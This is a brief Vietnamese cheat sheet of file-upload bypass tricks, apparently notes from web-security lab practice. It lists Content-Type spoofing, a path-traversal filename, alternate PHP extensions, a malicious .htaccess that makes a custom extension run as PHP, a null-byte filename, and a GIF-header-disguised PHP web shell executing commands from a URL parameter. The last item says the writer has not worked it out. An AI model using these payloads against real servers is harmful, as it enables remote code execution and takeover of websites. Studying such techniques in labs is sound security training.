# File Upload
1. Sua `Content-Type: image/jpeg`
2. Path traversal: `Content-Disposition: form-data; name="avatar"; filename="..%2fhaha.php"`
3. Black list: Dung `.phar`, `.phtml`
4. Upload file `.htaccess`

`Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .t1en`

Gio co the upload file bat ky co duoi la `.t1en`(haha.t1en)

5. `Content-Disposition: form-data; name="avatar"; filename="haha.php%00.png"`

6. file signatures: `GIF89a;<?php system($_GET['cmd']); ?>`

[file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

7. chua hieu cach lam
